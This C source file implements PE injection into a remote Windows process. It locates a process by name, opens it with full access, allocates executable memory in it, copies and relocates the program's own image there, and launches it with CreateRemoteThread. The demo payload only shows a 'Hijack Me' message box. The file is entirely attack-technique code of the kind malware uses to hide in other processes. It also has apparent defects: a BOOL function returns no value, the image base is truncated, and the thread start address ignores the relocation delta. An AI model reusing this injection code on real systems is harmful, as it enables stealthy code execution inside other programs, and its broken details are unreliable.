#include "utils.h"
#include "struct.h"

// https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
// https://www.cnblogs.com/LyShark/p/17684114.html

VOID Dumbo(VOID)
{
	MessageBoxA(NULL, "PE Injection Successful!", "Hijack Me", MB_OK);
	return;
}

BOOL GetRemoteProcID
(
	IN LPCWSTR ProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = 0;


	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		printf("[!] HeapAlloc Failed!\n");
		return FALSE;
	}

	pValueToFree = SystemProcInfo;

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	while (TRUE) {
		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0)
		{
			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
			break;
		}

		if (!SystemProcInfo->NextEntryOffset)
			break;

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*PID == NULL || *hProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL GrabPeHeader
(
	OUT PIMAGE_NT_HEADERS* pImgNt,
	OUT PIMAGE_SECTION_HEADER* pImgSecHeader,
	OUT PIMAGE_DATA_DIRECTORY* pImgDataDir,
	IN LPVOID lpFile
)

{

	PBYTE pBase = (PBYTE)lpFile;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return;
	}

	PIMAGE_NT_HEADERS pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return;
	}

	PIMAGE_OPTIONAL_HEADER pImgOpt = &pImgNt64->OptionalHeader;

	PIMAGE_SECTION_HEADER pImgSecHead = IMAGE_FIRST_SECTION(pImgNt64);

	PIMAGE_DATA_DIRECTORY pImgDataDir64 = &pImgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	*pImgNt = pImgNt64;
	*pImgSecHeader = pImgSecHead;
	*pImgDataDir = pImgDataDir64;

}

BOOL PEInject
(
	IN PIMAGE_SECTION_HEADER pImgSecHeader,
	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN HANDLE hProcess
)
{

	HANDLE hThread;
	PVOID localBuffer, remoteBuffer;
	SIZE_T lpNumOfBytesWritten;

	PVOID pBase = GetModuleHandle(NULL);
	DWORD pImageBase = pImgNt->OptionalHeader.ImageBase;

	if ((localBuffer = VirtualAlloc(NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL)
	{
		PRINT_ERROR("VirtualAlloc");
		return FALSE;
	}

	INFO("[0x%p] Local Buffer Address", localBuffer);

	memcpy(localBuffer, pBase, pImgNt->OptionalHeader.SizeOfImage);

	if ((remoteBuffer = VirtualAllocEx(hProcess, NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		return FALSE;
	 }

	LPVOID RemoteBase = remoteBuffer;

	INFO("[0x%p] Remote Buffer Address", RemoteBase);

	DWORD_PTR dwDelta = (DWORD_PTR)RemoteBase - (DWORD_PTR)pImageBase;

	printf(
		"[v] [0x%p] Source Image Base\n"
		"[v] [0x%p] Dest Image Base\n"
		"[v] [0x%p] Relocation Delta\n",
		pImageBase,
		RemoteBase,
		dwDelta
	);

	DWORD RelocRVA = pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)localBuffer + RelocRVA);
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	INFO("ImageBase: 0x%08X | RelocRVA: 0x%08X | Reloc: 0x%08X", pImageBase, RelocRVA, Reloc);

	while (Reloc->SizeOfBlock)
	{
		DWORD size = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(Reloc + 1);

		INFO("VirtualAddress: 0x%08X | SizeofBlock: 0x%04d | Size: 0x%04d", Reloc->VirtualAddress, Reloc->SizeOfBlock, size);

		for (DWORD i = 0; i < size; i++)
		{
			if (relocationRVA[i].Type == IMAGE_REL_BASED_DIR64)
			{
				ULONGLONG* PatchedAddress = (ULONGLONG*)((PBYTE)localBuffer + Reloc->VirtualAddress + relocationRVA[i].Offset);
				*PatchedAddress += (ULONGLONG)dwDelta;
			}
		}
		Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);
	}

	if (!WriteProcessMemory(hProcess, RemoteBase, localBuffer, pImgNt->OptionalHeader.SizeOfImage, &lpNumOfBytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		return FALSE;
	}

	INFO("Wrote Process Memory --> [0x%p] With Size --> [%d]", RemoteBase, pImgNt->OptionalHeader.SizeOfHeaders);

	if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Dumbo, NULL, 0, NULL))
	{
		PRINT_ERROR("CreateRemoteThread");
		return FALSE;
	}

	INFO("CreatedRemoteThread");

	OKAY("DONE!");

	return TRUE;

}